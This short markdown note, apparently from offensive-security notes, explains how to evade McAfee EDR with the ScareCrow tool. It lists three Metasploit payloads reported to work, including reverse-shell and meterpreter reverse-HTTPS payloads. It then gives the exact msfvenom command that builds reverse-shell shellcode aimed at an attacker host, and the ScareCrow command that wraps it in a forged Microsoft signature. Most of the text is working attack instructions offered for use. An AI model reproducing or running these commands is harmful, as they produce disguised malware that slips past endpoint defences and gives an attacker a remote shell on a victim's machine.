# Bypassing using ScareCrow

You can use the [scarecrow](https://github.com/optiv/ScareCrow) tool to bypass McAfee EDR. We tested 3 types of metasploit payloads that work, they are:

* windows/x64/shell/reverse_tcp
* windows/x64/meterpreter_reverse_https
* windows/x64/exec

Commands:
```
$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -a x64 -e x64/xor > shellcode.bin 
$ ./ScareCrow_4.11_linux_amd64 -I shellcode.bin -domain microsoft.com 
```

It obscures itself to circumvent protections and also contains a false signature to give more credibility to the target.
![](https://github.com/optiv/ScareCrow/raw/main/Screenshots/File_Attributes.png)
